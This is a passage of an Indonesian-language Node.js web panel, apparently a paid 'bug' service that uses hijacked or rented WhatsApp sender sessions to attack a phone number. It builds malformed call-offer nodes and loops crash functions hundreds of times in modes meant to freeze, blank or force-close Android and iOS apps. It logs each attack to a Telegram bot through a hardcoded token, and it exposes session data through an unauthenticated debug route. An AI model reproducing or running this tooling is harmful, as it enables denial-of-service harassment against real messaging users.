        let bytes = Official(Cyber ? Cyber(msg) : encodeWAMessage(msg));

        return permen.mutex(jid, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({
            jid,
            data: bytes
          });

          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { jid },
            content: [
              {
                tag: 'enc',
                attrs: { v: '2', type, ...extraAttrs },
                content: ciphertext
              }
            ]
          };
        });
      })
    );

    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity
    };
  };

  let Exo = crypto.randomBytes(32);
  let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);

  let {
    nodes: destinations,
    shouldIncludeDeviceIdentity
  } = await sock.createParticipantNodes(
    devices,
    { conversation: "y" },
    { count: '0' }
  );

  let lemiting = {
    tag: "call",
    attrs: {
      to: target,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [
      {
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity
            ? [
                {
                  tag: "device-identity",
                  attrs: {},
                  content: encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                  )
                }
              ]
            : [])
        ]
      }
    ]
  };

  await sock.sendNode(lemiting);
}
// ───── STOP FUNCTION BUG ───── \\
async function bugdelay(sock, target) {
     for (let i = 0; i < 300; i++) {
         await CarouselLolipop(sock, target);
         await InvisHard(sock, target, mention = false);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function ForcloseFlow(sock, target) {
     for (let i = 0; i < 500; i++) {
         await callCrash(sock, target, isVideo = false);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function blankandro(sock, target) {
     for (let i = 0; i < 500; i++) {
         await BuldozerFreeze(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

async function blankios(sock, target) {
     for (let i = 0; i < 500; i++) {
         await FcLolipop(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function invisios(sock, target) {
     for (let i = 0; i < 500; i++) {
         await FcLolipop(sock, target);
         await BuldozerFreeze(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "FLOWX", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/dashboard");
});

app.get('/dashboard', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'FLOWX', 'dashboard.html'));
});

app.get("/api/dashboard-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  let role = "User";
  const userId = req.cookies.sessionUser; 
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Moderator";
  } else if (isPT(userId)) {
    role = "PT";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized";
  }

  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: role,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});
      
const BOT_TOKEN = "8582867972:AAGPd1PHox4GSTD0QKr3gTBw9Ob4LiRNqQ4";
const CHAT_ID = "2113286230";
let lastExecution = 0;

app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    console.log(`[INFO] Execution accessed by user: ${username}`);
    
    const filePath = "./FLOWX/Login.html";
    const html = await fs.promises.readFile(filePath, "utf8").catch(err => {
      return res.status(500).send("✗ Gagal baca file Login.html");
    });

    if (!username) {
      console.log(`[INFO] No username, redirecting to login`);
      return res.send(html);
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      console.log(`[INFO] User ${username} expired or not found`);
      return res.send(html);
    }

    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target;
    const mode = req.query.mode;
    
    console.log(`[INFO] Query params - justExecuted: ${justExecuted}, target: ${targetNumber}, mode: ${mode}`);

    if (!targetNumber || targetNumber === 'undefined') {
      return res.send(executionPage("❌ Target Tidak Valid", {
        message: "Nomor target tidak valid atau kosong. Pastikan format: 628xxxxxxx",
        activeSenders: []
      }, false, currentUser, "Nomor target tidak valid", mode));
    }

    if (!mode || mode === 'undefined') {
      return res.send(executionPage("❌ Mode Tidak Dikenal", {
        target: targetNumber,
        message: "Mode bug tidak dipilih. Silakan pilih jenis bug terlebih dahulu.",
        activeSenders: []
      }, false, currentUser, "Mode tidak dikenal", mode));
    }

    const cleanTarget = targetNumber.replace(/\D/g, '');
    if (!cleanTarget.startsWith('62') || cleanTarget.length < 10) {
      return res.send(executionPage("❌ Format Nomor Salah", {
        target: targetNumber,
        message: "Format nomor harus diawali dengan 62 dan minimal 10 digit",
        activeSenders: []
      }, false, currentUser, "Format nomor salah", mode));
    }

    if (justExecuted) {
      return res.send(executionPage("✓ S U C C E S", {
        target: cleanTarget,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed`
      }, false, currentUser, "", mode));
    }

    console.log(`[INFO SESSION] Checking sessions for user: ${username}`);
    
    const userSessions = loadUserSessions();
    
    const userSenders = userSessions[username] || [];
    
    const activeUserSenders = userSenders.filter(sender => {
      const hasSession = sessions.has(sender);
      return hasSession;
    });

    if (activeUserSenders.length === 0) {
      console.log(`[INFO] No active senders found for user ${username}`);
      return res.send(executionPage("❌ Tidak Ada Sender Aktif", {
        message: "Anda tidak memiliki sender WhatsApp yang aktif. Silakan tambahkan sender terlebih dahulu di menu 'My Senders'."
      }, false, currentUser, "", mode));
    }

    const validModes = ["delay", "blank", "forclose", "iosblank", "fcinvsios"];
    if (!validModes.includes(mode)) {
      console.log(`[INFO] Invalid mode: ${mode}`);
      return res.send(executionPage("❌ Mode Tidak Valid", {
        target: cleanTarget,
        message: `Mode '${mode}' tidak dikenali. Mode yang valid: ${validModes.join(', ')}`,
        activeSenders: activeUserSenders
      }, false, currentUser, "Mode tidak valid", mode));
    }

    try {
      const userSender = activeUserSenders[0];
      const sock = sessions.get(userSender);
      
      console.log(`[INFO SOCKET] Selected sender: ${userSender}`);
      console.log(`[INFO SOCKET] Socket object:`, sock ? 'EXISTS' : 'NULL');
      
      if (!sock) {
        console.error(`[ERROR] Socket is null for sender: ${userSender}`);
        throw new Error("Sender tidak aktif. Silakan periksa koneksi sender Anda.");
      }

      const target = `${cleanTarget}@s.whatsapp.net`;
      
      let bugResult;
      if (mode === "delay") {
        bugResult = await bugdelay(sock, target);
      } else if (mode === "blank") {
        bugResult = await blankandro(sock, target);
      } else if (mode === "forclose") {
        bugResult = await ForcloseFlow(sock, target);
      } else if (mode === "iosblank") {
        bugResult = await blankios(sock, target);
      } else if (mode === "fcinvsios") {
        bugResult = await invisios(sock, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      lastExecution = Date.now();

      console.log(`[EXECUTION SUCCESS] User: ${username} | Sender: ${userSender} | Target: ${cleanTarget} | Mode: ${mode} | Time: ${new Date().toLocaleString("id-ID")}`);

      const logMessage = `<blockquote>⚡ <b>New Execution Success</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget}
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      return res.redirect(`/execution?justExecuted=true&target=${encodeURIComponent(cleanTarget)}&mode=${mode}`);
      
    } catch (err) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, err.message);
      console.error(`[EXECUTION ERROR] Stack:`, err.stack);
      
      return res.send(executionPage("✗ Gagal kirim", {
        target: cleanTarget,
        message: err.message || "Terjadi kesalahan saat pengiriman.",
        activeSenders: activeUserSenders
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

app.get("/debug-sessions", (req, res) => {
  const userSessions = loadUserSessions();
  const activeSessions = Array.from(sessions.keys());
  
  let fileDetails = {};
  for (const [username, numbers] of Object.entries(userSessions)) {
    fileDetails[username] = {};
    numbers.forEach(number => {
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      fileDetails[username][number] = {
        session_dir: sessionDir,
        dir_exists: fs.existsSync(sessionDir),
        creds_exists: fs.existsSync(credsPath),
        creds_size: fs.existsSync(credsPath) ? fs.statSync(credsPath).size : 0
      };
    });
  }
  
  res.json({
    timestamp: new Date().toISOString(),
    sessions_map_size: sessions.size,
    sessions_map_content: activeSessions,
    user_sessions_content: userSessions,
    file_structure: fileDetails,
    problem: sessions.size === 0 ? "❌ NO ACTIVE SESSIONS" : "✅ SESSIONS ACTIVE"
  });
});

// ==================== YOUTUBE DOWNLOADER ROUTES ==================== //

app.get("/youtube-downloader", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "youtube-downloader.html");
  res.sendFile(filePath);
});

app.post('/api/youtube/search', requireAuth, async (req, res) => {
  const { query } = req.body;
  
  if (!query) {
    return res.status(400).json({ error: "Query pencarian wajib diisi." });
  }

  try {
    const apiEndpoints = [
      `https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`,
      `https://api.nvidiabotz.xyz/search/youtube?q=${encodeURIComponent(query)}`,
      `https://yt-api.mojokertohost.xyz/search?q=${encodeURIComponent(query)}`
    ];

    let searchData = null;
    
    for (const endpoint of apiEndpoints) {
      try {
        console.log(`Mencoba API: ${endpoint}`);
        const response = await axios.get(endpoint, { timeout: 10000 });
        
        if (response.data && (response.data.data || response.data.result)) {
          searchData = response.data.data || response.data.result;
          console.log(`Berhasil dengan API: ${endpoint}`);
          break;
        }
      } catch (apiError) {
        console.log(`API ${endpoint} gagal:`, apiError.message);
        continue;
      }
    }

    if (!searchData) {
      return res.status(404).json({ 
        error: "Semua API tidak merespons. Coba lagi nanti." 
      });
    }

    const formattedResults = Array.isArray(searchData) ? searchData : [searchData];
    
    return res.json({
      success: true,
      results: formattedResults
    });

  } catch (error) {
    console.error('YouTube Search Error:', error.message);
    res.status(500).json({ 
      error: "Gagal mencari video. Coba gunakan kata kunci lain." 
    });
  }
});

app.post('/api/youtube/download', requireAuth, async (req, res) => {
  const { url } = req.body;
  
  if (!url) {
    return res.status(400).json({ error: "URL video YouTube wajib diisi." });
  }

  try {
    const downloadEndpoints = [
      `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(url)}`,
      `https://api.azz.biz.id/download/ytmp3?url=${encodeURIComponent(url)}`,
      `https://yt-api.mojokertohost.xyz/download?url=${encodeURIComponent(url)}&type=mp3`
    ];

    let downloadUrl = null;
    let audioTitle = "YouTube Audio";
    
    for (const endpoint of downloadEndpoints) {
      try {
        console.log(`Mencoba download API: ${endpoint}`);
        const response = await axios.get(endpoint, { timeout: 15000 });
        
        if (response.data && response.data.result) {
          downloadUrl = response.data.result;
          audioTitle = response.data.title || "YouTube Audio";
          console.log(`Berhasil dengan download API: ${endpoint}`);
          break;
        }
      } catch (apiError) {
        console.log(`Download API ${endpoint} gagal:`, apiError.message);
        continue;
      }
    }

    if (!downloadUrl) {
      return res.status(404).json({ 
        error: "Tidak dapat mengunduh audio. Coba video lain." 
      });
    }

    return res.json({
      success: true,
      audioUrl: downloadUrl,
      title: audioTitle
    });

  } catch (error) {
    console.error('YouTube Download Error:', error.message);
    res.status(500).json({ 
      error: "Terjadi kesalahan saat memproses download." 
    });
  }
});

app.get("/tt", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/myinfo", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/qr", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "qr.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/quote", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "iqc.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/music", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "music.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/nsfw-generator", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "image.html");
  res.sendFile(filePath);
});

app.get('/api/nsfw/random', requireAuth, async (req, res) => {
  try {
    const apiEndpoints = [
      'https://api.waifu.pics/nsfw/waifu',
      'https://api.waifu.pics/nsfw/neko',
      'https://api.waifu.pics/nsfw/blowjob',
      'https://nekos.life/api/v2/img/nsfw_neko_gif',
      'https://nekos.life/api/v2/img/lewd',
      'https://purrbot.site/api/img/nsfw/neko/gif'
    ];

    let imageUrl = null;
    let attempts = 0;

    for (const endpoint of apiEndpoints) {
      attempts++;
      try {
        console.log(`Mencoba API: ${endpoint}`);
        const response = await axios.get(endpoint, { timeout: 10000 });
        
        if (response.data) {
          if (response.data.url) {
            imageUrl = response.data.url;
          } else if (response.data.image) {
            imageUrl = response.data.image;
          } else if (response.data.message) {
            imageUrl = response.data.message;
          } else if (response.data.result) {
            imageUrl = response.data.result;
          }
        }

        if (imageUrl) {
          console.log(`✅ Berhasil dengan API: ${endpoint}`);
          break;
        }
      } catch (apiError) {
        console.log(`❌ API ${endpoint} gagal:`, apiError.message);
        continue;
      }
    }

    if (imageUrl) {
      return res.json({
        success: true,
        image: imageUrl
      });
    } else {
      return res.status(404).json({ 
        error: "Semua API tidak merespons. Coba lagi nanti." 
      });
    }

  } catch (error) {
    console.error('NSFW API Error:', error.message);
    res.status(500).json({ 
      error: "Gagal mengambil gambar. Server API sedang gangguan." 
    });
  }
});

app.get("/mysender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "my-senders.html");
  res.sendFile(filePath);
});

app.get("/api/mysenders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  userEvents.set(username, res);

  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('62')) {
    return res.json({ success: false, error: "Nomor harus diawali dengan 62" });
  }
  
  if (cleanNumber.length < 10) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.get("/api/user-info", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ 
      success: false, 
      error: "User not found" 
    });
  }

  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));
  const hoursRemaining = Math.max(0, Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)));
  const minutesRemaining = Math.max(0, Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60)));

  const expiredDate = new Date(currentUser.expired).toLocaleDateString("id-ID", {
    timeZone: "Asia/Jakarta",
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  });
  
  const expiredTime = new Date(currentUser.expired).toLocaleTimeString("id-ID", {
    timeZone: "Asia/Jakarta",
    hour: '2-digit',
    minute: '2-digit'
  });

  let role = "User";
  let roleIcon = "👤";
  let roleColor = "#94a3b8";
  let roleBadge = "USER";
  
  if (isOwner(username)) {
    role = "Owner";
    roleIcon = "👑";
    roleColor = "#f59e0b";
    roleBadge = "OWNER";
  } else if (isModerator(username)) {
    role = "Moderator";
    roleIcon = "🛡️";
    roleColor = "#3b82f6";
    roleBadge = "MOD";
  } else if (isPT(username)) {
    role = "PT";
    roleIcon = "⚡";
    roleColor = "#8b5cf6";
    roleBadge = "PT";
  } else if (isReseller(username)) {
    role = "Reseller";
    roleIcon = "💼";
    roleColor = "#10b981";
    roleBadge = "RESELLER";
  } else if (isAuthorized(username)) {
    role = "Authorized";
    roleIcon = "✅";
    roleColor = "#22c55e";
    roleBadge = "AUTHORIZED";
  }

  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  const activeSenders = userSenders.filter(sender => sessions.has(sender));

  let status = "ACTIVE";
  let statusColor = "#22c55e";
  let statusIcon = "🟢";
  
  if (timeRemaining <= 0) {
    status = "EXPIRED";
    statusColor = "#ef4444";
    statusIcon = "🔴";
  } else if (timeRemaining < 24 * 60 * 60 * 1000) {
    status = "SOON EXPIRED";
    statusColor = "#f59e0b";
    statusIcon = "🟡";
  }

  const createdAt = currentUser.createdAt || currentUser.expired - (30 * 24 * 60 * 60 * 1000);
  const createdDate = new Date(createdAt).toLocaleDateString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: 'numeric',
    month: 'short',
    day: 'numeric'
  });

  res.json({
    success: true,
    user: {
      username: currentUser.username,
      key: currentUser.key,
      role: role,
      roleIcon: roleIcon,
      roleColor: roleColor,
      roleBadge: roleBadge,
      expiredDate: expiredDate,
      expiredTime: expiredTime,
      daysRemaining: daysRemaining,
      hoursRemaining: hoursRemaining,
      minutesRemaining: minutesRemaining,
      isExpired: timeRemaining <= 0,
      willExpireSoon: timeRemaining > 0 && timeRemaining < 24 * 60 * 60 * 1000,
      totalSenders: userSenders.length,
      activeSenders: activeSenders.length,
      inactiveSenders: userSenders.length - activeSenders.length,
      createdAt: createdDate,
      status: status,
      statusColor: statusColor,
      statusIcon: statusIcon,
      lastLogin: new Date().toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        hour: '2-digit',
        minute: '2-digit'
      })
    }
  });
});

app.get("/api/system-stats", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const userSessions = loadUserSessions();
  
  const totalUsers = users.length;
  const activeUsers = users.filter(u => (u.expired - Date.now()) > 0).length;
  const expiredUsers = users.filter(u => (u.expired - Date.now()) <= 0).length;
  
  const activeSessions = sessions.size;
  const memoryUsage = process.memoryUsage();
  const memoryMB = Math.round(memoryUsage.heapUsed / 1024 / 1024 * 100) / 100;
  const memoryTotalMB = Math.round(memoryUsage.heapTotal / 1024 / 1024 * 100) / 100;
  
  const uptime = process.uptime();
  const uptimeHours = Math.floor(uptime / 3600);
  const uptimeMinutes = Math.floor((uptime % 3600) / 60);
  
  res.json({
    success: true,
    stats: {
      totalUsers: totalUsers,
      activeUsers: activeUsers,
      expiredUsers: expiredUsers,
      activeSessions: activeSessions,
      memoryUsage: `${memoryMB} MB / ${memoryTotalMB} MB`,
      uptime: `${uptimeHours}h ${uptimeMinutes}m`,
      serverTime: new Date().toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta"
      }),
      cpuUsage: `${(process.cpuUsage().user / 1000000).toFixed(2)}s`,
      nodeVersion: process.version
    }
  });
});

app.post("/api/update-user", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const { action } = req.body;
  
  if (!isOwner(username) && !isModerator(username)) {
    return res.status(403).json({ 
      success: false, 
      error: "Access denied" 
    });
  }
  
  if (action === "refresh") {
    res.json({
      success: true,
      message: "User data refreshed successfully",
      timestamp: new Date().toISOString()
    });
  } else {
    res.status(400).json({
      success: false,
      error: "Invalid action"
    });
  }
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

app.get("/youtube-downloader", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "FLOWX", "youtube-downloader.html");
  res.sendFile(filePath);
});

app.post('/api/youtube/search', requireAuth, async (req, res) => {
  const { query } = req.body;
  
  if (!query) {
    return res.status(400).json({
      error: "Query pencarian wajib diisi."
    });
  }

  try {
    const searchResponse = await axios.get(`https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`);
    
    if (searchResponse.data && searchResponse.data.data) {
      return res.json({
        success: true,
        results: searchResponse.data.data
      });
    } else {
      return res.status(404).json({
        error: "Tidak ada hasil ditemukan"
      });
    }
  } catch (error) {
    console.error('YouTube Search Error:', error);
    res.status(500).json({
      error: error.message || "Terjadi kesalahan saat mencari video"
    });
  }
});

app.post('/api/youtube/download', requireAuth, async (req, res) => {
  const { url } = req.body;
  
  if (!url) {
    return res.status(400).json({
      error: "URL video YouTube wajib diisi."
    });
  }

  try {
    const downloadResponse = await axios.get(`https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(url)}`);
    
    if (downloadResponse.data && downloadResponse.data.result) {
      return res.json({
        success: true,
        audioUrl: downloadResponse.data.result
      });
    } else {
      return res.status(404).json({
        error: "Gagal mendapatkan URL download"
      });
    }
  } catch (error) {
    console.error('YouTube Download Error:', error);
    res.status(500).json({
      error: error.message || "Terjadi kesalahan saat mendownload audio"
    });
  }
});

app.get("/anime-search", requireAuth, (req, res) => {
    const filePath = path.join(__dirname, "FLOWX", "anime-search.html");
    res.sendFile(filePath);
});

app.get('/api/anime/search', requireAuth, async (req, res) => {
    const { query } = req.query;
    
    if (!query || typeof query !== 'string') {
        return res.status(400).json({
            success: false,
            error: "Query pencarian wajib diisi."
        });
    }

    if (query.length > 100) {
        return res.status(400).json({
            success: false,
            error: "Query terlalu panjang. Maksimal 100 karakter."
        });
    }

    try {
        console.log(`[Anime-Search] Request dari ${req.ip}: ${query.substring(0, 50)}${query.length > 50 ? '...' : ''}`);
        
        const apiUrl = `https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=1`;
        
        const animeResponse = await axios.get(apiUrl, {
            timeout: 30000,
            headers: {
                'User-Agent': 'FlowX-Anime-Search/1.0',
                'Accept': 'application/json'
            }
        });
        
        console.log(`[Anime-Search] Jikan API response status: ${animeResponse.status}`);
        
        if (!animeResponse.data?.data || animeResponse.data.data.length === 0) {
            return res.status(404).json({
                success: false,
                error: "Tidak menemukan anime dengan judul tersebut."
            });
        }

        const anime = animeResponse.data.data[0];
        
        const formattedAnime = {
            title: anime.title || 'Tidak diketahui',
            type: anime.type || '-',
            episodes: anime.episodes || null,
            score: anime.score || null,
            status: anime.status || '-',
            synopsis: anime.synopsis || 'Tidak ada sinopsis.',
            url: anime.url || '#',
            image_url: anime.images?.jpg?.large_image_url || anime.images?.jpg?.image_url || ''
        };
        
        console.log(`[Anime-Search] Found anime: ${formattedAnime.title}`);
        
        return res.json({
            success: true,
            data: formattedAnime,
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('[Anime-Search] Error:', {
            message: error.message,
            code: error.code,
            url: error.config?.url,
            status: error.response?.status,
            data: error.response?.data
        });
        
        const fallbackMessage = "Maaf, terjadi kesalahan saat mencari anime. Silakan coba lagi nanti.";
        
        return res.status(500).json({
            success: false,
            error: fallbackMessage,
            timestamp: new Date().toISOString()
        });
    }
});

app.get('/api/anime/health', (req, res) => {
    res.json({
        status: 'healthy',
        service: 'FlowX Anime Search API',
        version: '1.0.0',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        endpoints: {
            search: '/api/anime/search [GET]',
            health: '/api/anime/health [GET]'
        }
    });
});

app.get('/api/anime/test', requireAuth, async (req, res) => {
    try {
        const testResponse = await axios.get(
            'https://api.jikan.moe/v4/anime?q=naruto&limit=1',
            { timeout: 10000 }
        );
        
        const isWorking = testResponse.status === 200 && testResponse.data;
        
        res.json({
            success: true,
            status: 'online',
            api: 'Jikan API (MyAnimeList)',
            responseTime: 'unknown',
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        res.json({
            success: false,
            status: 'offline',
            api: 'Jikan API (MyAnimeList)',
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  userRole = "user"
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
